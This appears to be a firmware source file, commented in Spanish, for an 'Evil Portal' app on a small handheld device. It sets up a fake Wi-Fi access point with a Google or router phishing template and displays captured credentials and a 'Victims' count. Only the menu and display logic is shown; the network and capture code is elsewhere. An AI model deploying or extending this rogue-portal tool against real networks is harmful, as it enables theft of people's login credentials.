#include "app.h"
#include "apps.h"
#include "literals.h"
#include "devices/display.h"
#include "tasks/ui_task.h"
#include "tasks/wifi_portal_task.h"
#include "utils/menu.h" // Menu, drawMenu, menuHandleEvent, showPopupMenu

// La app tiene dos estados: CONFIG (elegir plantilla/SSID y arrancar) y RUNNING
// (portal levantado, se muestra el estado). El worker wifi_portal_task hace el
// trabajo de red; aquí solo se dibuja y se gestionan los botones.
//
// El CONFIG reutiliza el sistema de menús del firmware (drawStaticMenu), así el
// ítem seleccionado se pinta con fondo invertido y la plantilla se cambia con
// scroll lateral (< >), igual que los submenús de ajustes.
enum EpState { EP_CONFIG, EP_RUNNING };
static EpState ep_state = EP_CONFIG;

static String  ep_ssid = "Free WiFi";
static uint8_t ep_channel = 1;
static uint8_t ep_template = TPL_GOOGLE;

static Menu ep_menu;
static int  ep_row = 0;

static const char *templateName(uint8_t t) { return t == TPL_ROUTER ? "Router" : "Google"; }

// Recorta una cadena a maxChars (la vista RUNNING no usa el menú y sí necesita
// ajustar el texto al ancho del OLED).
static String truncate(const String &s, uint8_t maxChars) {
    if (s.length() <= maxChars) return s;
    return s.substring(0, maxChars);
}

static void exitToMenu() {
    stopPortalTask();
    extern App *currentApp;
    currentApp = &app_menu;
    currentApp->onStart();
}

static void startPortal() {
    if (ep_ssid.isEmpty()) ep_ssid = "Free WiFi";
    if (startPortalTask(ep_ssid, ep_channel, ep_template)) ep_state = EP_RUNNING;
    else showPopupMenu("Start failed");
}

void evil_portal_onStart() {
    ep_state = EP_CONFIG;
    ep_row = 0;
    createMenu(&ep_menu, NULL, []() {
        // Plantilla: scroll lateral (< >). BACK sale de la app.
        ep_menu.list->add(MenuNode{
            []() -> uint16_t { return 0; },
            []() { return String("Template <") + templateName(ep_template) + ">"; },
            []() {},
            []() { exitToMenu(); },
            []() { ep_template = (uint8_t) ((ep_template + TPL_COUNT - 1) % TPL_COUNT); },
            []() { ep_template = (uint8_t) ((ep_template + 1) % TPL_COUNT); }
        });
        // SSID: OK abre el teclado en pantalla.
        addMenuNode(
            &ep_menu, []() { return String("SSID: ") + ep_ssid; },
            []() { startKeyboard(&ep_ssid); }, []() { exitToMenu(); }
        );
        // Arrancar el portal.
        addMenuNode(
            &ep_menu, []() { return String("Start portal"); }, []() { startPortal(); },
            []() { exitToMenu(); }
        );
    });
    ep_menu.build();
    ep_menu.selected = 0;
}

void evil_portal_onStop() { stopPortalTask(); }

void evil_portal_onEvent(int evt) {
    if (ep_state == EP_CONFIG) {
        menuHandleEvent(&ep_menu, evt);
    } else { // EP_RUNNING
        if (evt == BTN_BACK) {
            stopPortalTask();
            ep_state = EP_CONFIG;
            ep_menu.selected = 0;
        }
    }
}

static void drawRunning(U8G2 *u8g2) {
    char ip[16];
    char cred[160];
    portalGetApIp(ip, sizeof(ip));
    portalGetLastCred(cred, sizeof(cred));
    uint32_t victims = portalGetCapturedCount();

    u8g2->setFont(u8g2_font_6x13_tr);
    u8g2->drawStr(0, 11, "EVIL PORTAL");
    u8g2->drawHLine(0, 15, 128);

    u8g2->setFont(u8g2_font_5x8_tr);
    u8g2->drawStr(0, 25, truncate(String("AP: ") + ep_ssid, 25).c_str());
    u8g2->drawStr(0, 34, (String("IP: ") + ip).c_str());
    u8g2->drawStr(0, 43, (String("Victims: ") + victims).c_str());

    // Últimas 2 líneas de la credencial capturada (key: val\nkey: val).
    String c = cred;
    int y = 52;
    for (int line = 0; line < 2 && c.length() > 0; line++) {
        int nl = c.indexOf('\n');
        String part = (nl >= 0) ? c.substring(0, nl) : c;
        u8g2->drawStr(0, y, truncate(part, 25).c_str());
        y += 8;
        if (nl < 0) break;
        c = c.substring(nl + 1);
    }
}

void evil_portal_onDraw(U8G2 *u8g2) {
    u8g2->clearBuffer();
    u8g2->setDrawColor(1);
    if (ep_state == EP_CONFIG) ep_row = drawMenu(u8g2, &ep_menu, ep_row);
    else drawRunning(u8g2);
    u8g2->sendBuffer();
}

App app_evil_portal = {
    .name = "Evil Portal",
    .onStart = evil_portal_onStart,
    .onEvent = evil_portal_onEvent,
    .onDraw = evil_portal_onDraw,
    .onStop = evil_portal_onStop,
};
